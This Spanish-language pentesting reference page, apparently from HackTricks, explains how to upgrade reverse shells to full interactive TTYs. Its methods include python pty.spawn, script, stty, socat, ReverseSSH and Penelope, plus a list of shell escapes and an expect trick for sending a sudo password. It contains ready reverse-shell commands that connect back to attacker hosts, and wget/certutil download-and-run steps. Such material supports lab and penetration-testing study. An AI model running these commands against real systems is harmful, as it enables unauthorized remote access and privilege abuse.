# TTYs completos

{{#include ../../banners/hacktricks-training.md}}

## TTY completo

`/etc/shells` enumera los nombres de ruta de los login shells válidos y es consultado por algunos programas; no es un requisito universal para asignar una PTY.<sup>[[3]](#references)[[4]](#references)</sup> Si un programa como `pkexec` rechaza `SHELL` con `The value for the SHELL variable was not found in the /etc/shells file`, asegúrate de que la ruta exacta del shell (por ejemplo, `/bin/bash`) aparezca en `/etc/shells`.<sup>[[10]](#references)</sup> La secuencia de recuperación `CTRL+Z`/`fg` que aparece a continuación utiliza el control de trabajos de Bash; si el shell actual no es Bash, inicia Bash antes de usar esa secuencia.<sup>[[7]](#references)</sup>

#### Python

`pty.spawn` de Python inicia un programa conectado a los streams estándar de entrada, salida y error del proceso actual, lo que proporciona a Bash una pseudo-terminal en esta sesión.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Puedes obtener el **número** de **filas** y **columnas** ejecutando **`stty -a`**; `-a` muestra toda la configuración actual del terminal. La salida del comando es específica del terminal, así que usa los valores proporcionados por la sesión actual.<sup>[[11]](#references)</sup>

#### script

La utilidad `script` registra una sesión de terminal; aquí `/dev/null` descarta el typescript, `-q` suprime los mensajes de inicio y finalización, y `-c` ejecuta Bash en lugar del shell predeterminado.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Después de cualquiera de los métodos de PTY-spawn, suspende la sesión de Netcat y restáurala con el modo raw local; después, configura el entorno y las dimensiones del terminal remoto:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

El listener usa el terminal actual en modo raw con el eco local deshabilitado y acepta conexiones TCP en el puerto 4444. El comando de la víctima asigna un pty, une stderr, crea una sesión, reenvía SIGINT y aplica configuraciones de terminal sane; añade `ctty` si el proceso hijo necesita un terminal de control.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Generar shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (versiones antiguas con `--interactive`): `!sh`

El escape de Nmap depende de la versión: Nmap eliminó el modo `--interactive` en versiones posteriores, por lo que `!sh` solo aplica a versiones antiguas.<sup>[[13]](#references)</sup>

## ReverseSSH

Una forma conveniente de obtener **acceso interactivo al shell**, así como realizar **transferencias de archivos** y **port forwarding**, es subir el servidor SSH enlazado estáticamente [ReverseSSH](https://github.com/Fahrj/reverse-ssh) al objetivo.<sup>[[1]](#references)</sup>

A continuación se muestra un ejemplo para `x86` con el binario comprimido con UPX publicado por el proyecto. Para otras arquitecturas o artefactos de release, usa la [página de releases](https://github.com/Fahrj/reverse-ssh/releases/latest/) como referencia.<sup>[[1]](#references)</sup>

1. Prepara el host local para aceptar la conexión SSH entrante. En modo listener, `-l` activa el listener y `-p 4444` selecciona el puerto en el que acepta la conexión del objetivo.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Objetivo Linux. Transfiere el mismo artefacto `upx_reverse-sshx86` a `/dev/shm/reverse-ssh` y hazlo ejecutable. El `-p 4444` del objetivo selecciona el puerto de escucha indicado arriba, y `kali@10.0.0.2` proporciona la cuenta y el host utilizados para conectarse de vuelta.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target. Full interactive PowerShell requires Windows 10 build 17763; consulta el [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
El ejemplo de Windows usa `certutil` con `-f -urlcache`; Microsoft documenta `-f` como una opción que fuerza la obtención de una URL y señala que los parámetros disponibles varían según la versión, así que consulta `certutil -?` si este formato no está disponible.<sup>[[12]](#references)</sup>

- Después de que la conexión inversa se establece correctamente, el listener en modo inverso de ReverseSSH enlaza el puerto `8888` de forma predeterminada (o el valor proporcionado con `-b`), y las conexiones entrantes aceptan cualquier nombre de usuario con la contraseña predeterminada `letmeinbrudipls`. El shell remoto se ejecuta con los privilegios de la cuenta que inició `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) actualiza automáticamente los reverse shells tipo Unix a PTY, cambia el tamaño de los terminales tipo Unix y registra las interacciones con el shell; para los shells de Windows proporciona readline, pero no permite cambiar el tamaño del terminal en tiempo real.<sup>[[2]](#references)</sup>

Ejecuta `penelope` para escuchar en `0.0.0.0:4444` de forma predeterminada; los shells tipo Unix entrantes se pueden actualizar y registrar automáticamente.<sup>[[2]](#references)</sup>

![Penelope gestionando y actualizando un shell entrante](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Sin TTY

Si por alguna razón no puedes obtener un TTY completo, **aun así puedes interactuar con programas** que esperan una entrada del usuario. En el siguiente ejemplo, Expect ejecuta `sudo`, espera su solicitud de contraseña, envía la contraseña y devuelve el control con `interact`; `sudo -S` lee su contraseña desde la entrada estándar. Úsalo únicamente en un laboratorio autorizado y evita colocar credenciales reales en el historial del shell o en archivos de código fuente.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - Servidor ssh enlazado estáticamente con funcionalidad de reverse shell para CTFs y similares](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler que automatiza algunas tareas para facilitar el trabajo](https://github.com/brightio/penelope)
- [3] [shells(5) — Página del manual de Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Documentación de Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Página del manual de Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Página del manual de Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Manual de referencia de Bash — Control de jobs](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Página del manual de Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Página del manual de Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Registro de cambios de Nmap](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
